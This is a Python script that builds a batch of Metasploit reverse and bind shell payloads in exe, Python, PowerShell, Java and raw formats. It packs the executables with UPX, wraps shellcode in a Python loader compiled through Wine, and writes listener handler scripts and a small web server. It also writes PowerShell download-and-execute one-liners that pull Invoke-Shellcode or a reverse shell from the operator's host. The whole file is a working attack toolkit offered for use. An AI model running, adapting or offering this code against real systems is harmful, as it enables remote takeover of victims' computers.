#!/usr/bin/env python3

# To install on 64bit Ubuntu/Debian/Kali:
#   dpkg --add-architecture i386
#   apt-get update
#   apt-get install wine32
#   apt-get install winbind

# On Kali:
#   apt-get install python3-netifaces python3-requests
# Or:
#   pip install netifaces requests

import subprocess
import os
import shutil
import stat
import requests
from urllib.parse import urlparse
import netifaces


def get_ip_address():
    def_gateway = netifaces.gateways()['default']
    def_gateway_name = def_gateway[netifaces.AF_INET][1]
    def_gateway_addr = netifaces.ifaddresses(def_gateway_name)
    return def_gateway_addr[netifaces.AF_INET][0]['addr']


SERVER = get_ip_address()
WEBSERVER_PORT = 8000

PS_REV_TCP_URL = "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1"
PS_INV_SC_URL = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1"

PYTHON_DOWNLOAD_URL = "https://www.python.org/ftp/python/2.7.13/python-2.7.13.msi"
PYTHON_MSI = os.path.basename(urlparse(PYTHON_DOWNLOAD_URL).path)

UPX_DOWNLOAD_URL = "https://github.com/upx/upx/releases/download/v3.94/upx394w.zip"
UPX_ZIP = os.path.basename(urlparse(UPX_DOWNLOAD_URL).path)

PY_TEMPLATE = """#!/usr/bin/env python
import ctypes

# Shellcode:
{}
shellcode = bytearray(buf)
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
"""


WEBSERVER = """#!/usr/bin/env python3
from http.server import SimpleHTTPRequestHandler, HTTPServer

PORT = {}
IP = '{}'

server_address = (IP, PORT)
httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
httpd.serve_forever()
""".format(WEBSERVER_PORT, SERVER)


SCRIPT_DIR = os.path.dirname(os.path.realpath(__file__))
WINE_DIR = '{}/wine'.format(SCRIPT_DIR)
OUTPUT_DIR = '{}/output'.format(SCRIPT_DIR)


def make_executable(f):
    st = os.stat(f)
    os.chmod(f, st.st_mode | stat.S_IEXEC)


def add_handler(payload, server, port, rhost=False):
    s = "use exploit/multi/handler\n"
    s += "set payload {}\n".format(payload)
    if rhost:
        s += "set rhost {}\n".format(server)
    else:
        s += "set lhost {}\n".format(server)
    s += "set lport {}\n".format(port)
    s += "set ExitOnSession false\n"
    s += "exploit -j\n\n"
    return s


def write_text_file(filename, content):
    print("Writing {} ...".format(filename))
    with open(filename, 'wt') as f:
        f.write(content)
    print("Done")
    print()


def download_file(url, local):
    r = requests.get(url)
    write_text_file(local, r.text)


def execute_command(c, env=None, shell=False):
    size = shutil.get_terminal_size()
    print('#' * size.columns)
    print()
    print("Executing {}".format(c))
    # Needed when shell = False
    if (type(c) is str and shell == False):
        c = c.split()
    try:
        if env:
            print("Environment: {}".format(env))
            print()
            output = subprocess.check_output(c, stderr=subprocess.STDOUT, env=env, shell=shell).decode('utf-8')
        else:
            output = subprocess.check_output(c, stderr=subprocess.STDOUT, shell=shell).decode('utf-8')
    except subprocess.CalledProcessError as e:
        output = "Error when running {}: {}\n".format(c, e.output.decode('utf-8'))
    print(output)
    print()
    print('#' * size.columns)
    print()


def get_wine_env():
    return dict(os.environ, WINEARCH='win32', WINEPREFIX=WINE_DIR)


def setup_wine():
    print("Setting up wine environment")
    if os.path.exists(WINE_DIR):
        print("Removing old wine dir {}".format(WINE_DIR))
        shutil.rmtree(WINE_DIR)
    if not os.path.exists('{}/{}'.format(SCRIPT_DIR, PYTHON_MSI)):
        print("Downloading python MSI")
        execute_command('wget -O {}/{} {}'.format(SCRIPT_DIR, PYTHON_MSI, PYTHON_DOWNLOAD_URL))
    if not os.path.exists('{}/{}'.format(SCRIPT_DIR, UPX_ZIP)):
        print("Downloading UPX zip")
        execute_command('wget -O {}/{} {}'.format(SCRIPT_DIR, UPX_ZIP, UPX_DOWNLOAD_URL))
    print("Setting up wine")
    # add wine env vars
    environment = get_wine_env()
    # print current env
    execute_command('env', environment)
    # setup wine dir
    execute_command('wineboot -u', environment)

    print("Installing UPX")
    execute_command("unzip -j -d {0}/drive_c/windows/system32/ {1}/{2} {3}/upx.exe".format(WINE_DIR, SCRIPT_DIR, UPX_ZIP, UPX_ZIP.replace('.zip', '')))
    print("Installing python")
    # install python
    execute_command('wine msiexec /i {}/{} TARGETDIR=C:\Python27 ALLUSERS=1 PrependPath=1 /q'.format(SCRIPT_DIR, PYTHON_MSI), environment)
    # upgrade pip
    execute_command('wine python.exe -m pip install --upgrade pip', environment)
    # install pyinstaller
    execute_command('wine pip install pyinstaller', environment)


PAYLOADS = [
    # exes
    {'filename': 'win_meter_rev_http_staged', 'payload': 'windows/meterpreter/reverse_http', 'port': 8001, 'format': 'exe'},
    {'filename': 'win_meter_rev_https_staged', 'payload': 'windows/meterpreter/reverse_https', 'port': 8002, 'format': 'exe'},
    {'filename': 'win_meter_rev_tcp_staged', 'payload': 'windows/meterpreter/reverse_tcp', 'port': 8003, 'format': 'exe'},
    {'filename': 'win_meter_rev_http', 'payload': 'windows/meterpreter_reverse_http', 'port': 8004, 'format': 'exe'},
    {'filename': 'win_meter_rev_https', 'payload': 'windows/meterpreter_reverse_https', 'port': 8005, 'format': 'exe'},
    {'filename': 'win_meter_rev_tcp', 'payload': 'windows/meterpreter_reverse_tcp', 'port': 8006, 'format': 'exe'},
    {'filename': 'win_meter_rev_winhttp_staged', 'payload': 'windows/meterpreter/reverse_winhttp', 'port': 8007, 'format': 'exe'},
    {'filename': 'win_meter_rev_winhttps_staged', 'payload': 'windows/meterpreter/reverse_winhttps', 'port': 8008, 'format': 'exe'},
    {'filename': 'win_meter_bind_tcp', 'payload': 'windows/meterpreter/bind_tcp', 'port': 8009, 'format': 'exe'},
    {'filename': 'win_shell_rev_tcp_staged', 'payload': 'windows/shell/reverse_tcp', 'port': 8010, 'format': 'exe'},
    {'filename': 'win_shell_rev_tcp', 'payload': 'windows/shell_reverse_tcp', 'port': 8011, 'format': 'exe'},
    {'filename': 'win_shell_bind_tcp', 'payload': 'windows/shell/bind_tcp', 'port': 8012, 'format': 'exe'},
    # python stuff
    {'filename': 'win_meter_rev_http_staged', 'payload': 'windows/meterpreter/reverse_http', 'port': 8101, 'format': 'py'},
    {'filename': 'win_meter_rev_https_staged', 'payload': 'windows/meterpreter/reverse_https', 'port': 8102, 'format': 'py'},
    {'filename': 'win_meter_rev_tcp_staged', 'payload': 'windows/meterpreter/reverse_tcp', 'port': 8103, 'format': 'py'},
    {'filename': 'win_meter_rev_http', 'payload': 'windows/meterpreter_reverse_http', 'port': 8104, 'format': 'py'},
    {'filename': 'win_meter_rev_https', 'payload': 'windows/meterpreter_reverse_https', 'port': 8105, 'format': 'py'},
    {'filename': 'win_meter_rev_tcp', 'payload': 'windows/meterpreter_reverse_tcp', 'port': 8106, 'format': 'py'},
    {'filename': 'win_meter_rev_winhttp_staged', 'payload': 'windows/meterpreter/reverse_winhttp', 'port': 8107, 'format': 'py'},
    {'filename': 'win_meter_rev_winhttps_staged', 'payload': 'windows/meterpreter/reverse_winhttps', 'port': 8108, 'format': 'py'},
    {'filename': 'win_meter_bind_tcp', 'payload': 'windows/meterpreter/bind_tcp', 'port': 8109, 'format': 'py'},
    {'filename': 'win_shell_rev_tcp_staged', 'payload': 'windows/shell/reverse_tcp', 'port': 8110, 'format': 'py'},
    {'filename': 'win_shell_rev_tcp', 'payload': 'windows/shell_reverse_tcp', 'port': 8111, 'format': 'py'},
    {'filename': 'win_shell_bind_tcp', 'payload': 'windows/shell/bind_tcp', 'port': 8112, 'format': 'py'},
    # invoke shellcode stuff
    {'filename': 'win_meter_rev_http_staged', 'payload': 'windows/meterpreter/reverse_http', 'port': 8201, 'format': 'ps1'},
    {'filename': 'win_meter_rev_https_staged', 'payload': 'windows/meterpreter/reverse_https', 'port': 8202, 'format': 'ps1'},
    {'filename': 'win_meter_rev_tcp_staged', 'payload': 'windows/meterpreter/reverse_tcp', 'port': 8203, 'format': 'ps1'},
    {'filename': 'win_meter_rev_http', 'payload': 'windows/meterpreter_reverse_http', 'port': 8204, 'format': 'ps1'},
    {'filename': 'win_meter_rev_https', 'payload': 'windows/meterpreter_reverse_https', 'port': 8205, 'format': 'ps1'},
    {'filename': 'win_meter_rev_tcp', 'payload': 'windows/meterpreter_reverse_tcp', 'port': 8206, 'format': 'ps1'},
    {'filename': 'win_meter_rev_winhttp_staged', 'payload': 'windows/meterpreter/reverse_winhttp', 'port': 8207, 'format': 'ps1'},
    {'filename': 'win_meter_rev_winhttps_staged', 'payload': 'windows/meterpreter/reverse_winhttps', 'port': 8208, 'format': 'ps1'},
    {'filename': 'win_meter_bind_tcp', 'payload': 'windows/meterpreter/bind_tcp', 'port': 8209, 'format': 'ps1'},
    {'filename': 'win_shell_rev_tcp_staged', 'payload': 'windows/shell/reverse_tcp', 'port': 8210, 'format': 'ps1'},
    {'filename': 'win_shell_rev_tcp', 'payload': 'windows/shell_reverse_tcp', 'port': 8211, 'format': 'ps1'},
    {'filename': 'win_shell_bind_tcp', 'payload': 'windows/shell/bind_tcp', 'port': 8212, 'format': 'ps1'},
    # java
    {'filename': 'java_meter_bind_tcp', 'payload': 'java/meterpreter/bind_tcp', 'port': 8301, 'format': 'jar'},
    {'filename': 'java_meter_rev_tcp_staged', 'payload': 'java/meterpreter/reverse_tcp', 'port': 8302, 'format': 'jar'},
    {'filename': 'java_meter_rev_http_staged', 'payload': 'java/meterpreter/reverse_http', 'port': 8303, 'format': 'jar'},
    {'filename': 'java_meter_rev_https_staged', 'payload': 'java/meterpreter/reverse_https', 'port': 8304, 'format': 'jar'},
    # powershell
    {'filename': 'ps_bind_tcp', 'payload': 'windows/powershell_bind_tcp', 'port': 8401, 'format': 'raw'},
    {'filename': 'ps_rev_tcp', 'payload': 'windows/powershell_reverse_tcp', 'port': 8402, 'format': 'raw'},
    # misc
    {'filename': 'cmd_win_rev_ps', 'payload': 'cmd/windows/reverse_powershell', 'port': 8501, 'format': 'raw'},
]

ADDITIONAL_HANDLERS = [
    {'payload': 'generic/shell_reverse_tcp', 'port': '8901'}
]

handler = ""
commands = ""

print("Detected IP {}".format(SERVER))

execute_command('env')

setup_wine()

if not os.path.exists(OUTPUT_DIR):
    os.makedirs(OUTPUT_DIR)

for p in PAYLOADS:
    rhost = True if "bind" in p['payload'] else False
    if rhost:
        host_s = "RHOST"
    else:
        host_s = "LHOST"
    command = 'msfvenom --platform windows -p {} -f {} -e generic/none -o {}/{}.{} {}={} LPORT={}'.format(p['payload'], p['format'], OUTPUT_DIR, p['filename'], p['format'], host_s, SERVER, p['port'])
    execute_command(command)
    handler += add_handler(p['payload'], SERVER, p['port'], rhost)
    print()
    if p['format'] == 'exe':
        print("Generating packed payload...")
        command = 'upx -9 -f -o {}/{}_upx.exe {}/{}.{}'.format(OUTPUT_DIR, p['filename'], OUTPUT_DIR, p['filename'], p['format'])
        execute_command(command)
        print()
    elif p['format'] == 'py':
        # add shellcode handler stuff
        print("Adding python stub")
        tmp_file = '{}/{}.{}'.format(OUTPUT_DIR, p['filename'], p['format'])
        buf = open(tmp_file).read()
        with open(tmp_file, 'wt') as tf:
            tf.write(PY_TEMPLATE.format(buf))
        print("Generating Python executable")
        python_exe = "{}_py".format(p['filename'])
        execute_command('wine pyinstaller -y --onefile --distpath={0} -n {1} {2}'.format(OUTPUT_DIR, python_exe, tmp_file), get_wine_env())
        os.remove('{}/{}.spec'.format(SCRIPT_DIR, python_exe))
        os.remove(tmp_file)
        print("Done")
        print()
    elif p['format'] == 'ps1':
        tmp_file = '{}/{}.{}'.format(OUTPUT_DIR, p['filename'], p['format'])
        buf = open(tmp_file).read()
        os.remove(tmp_file)

        buf = buf.replace("\n", ",")
        buf = buf.replace("$buf += ", "")
        buf = buf.replace("[Byte[]] $buf = ", "")
        buf = buf.rstrip(',')
        txt = "# {}\n".format(p['payload'])
        txt += "%SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -File {}.ps1\n".format(p['filename'])

        ps1 = "iex(new-object net.webclient).downloadstring('http://{}:{}/invsc.ps1')\n".format(SERVER, WEBSERVER_PORT)
        ps1 += "Invoke-Shellcode -Shellcode @({})\n".format(buf)

        write_text_file('{}/{}.txt'.format(OUTPUT_DIR, p['filename']), txt)
        write_text_file('{}/{}.ps1'.format(OUTPUT_DIR, p['filename']), ps1)

print("Adding additional handlers ...")
for h in ADDITIONAL_HANDLERS:
    handler += add_handler(h['payload'], SERVER, h['port'])
    commands += "iex(new-object net.webclient).downloadstring('http://{}:{}/reverse.ps1')\n".format(SERVER, WEBSERVER_PORT)
    commands += "Invoke-PowerShellTcp -Reverse -IPAddress {} -Port {}\n".format(SERVER, h['port'])
    commands += "\n\n"
print("Done")
print()

print("Downloading reverse TCP")
download_file(PS_REV_TCP_URL, '{}/reverse.ps1'.format(OUTPUT_DIR))
print("Done")
print()

print("Downloading Invoke-Shellcode")
download_file(PS_INV_SC_URL, '{}/invsc.ps1'.format(OUTPUT_DIR))
print("Done")
print()


write_text_file('{}/handler.rc'.format(OUTPUT_DIR), handler)
write_text_file('{}/webserver.py'.format(OUTPUT_DIR), WEBSERVER)
make_executable('{}/webserver.py'.format(OUTPUT_DIR))
write_text_file('{}/commands.txt'.format(OUTPUT_DIR), commands)

print("Cleanup")
for x in ('build', 'wine'):
    if os.path.exists(x):
        print("Removing dir {}".format(x))
        shutil.rmtree(x)
print("Done")
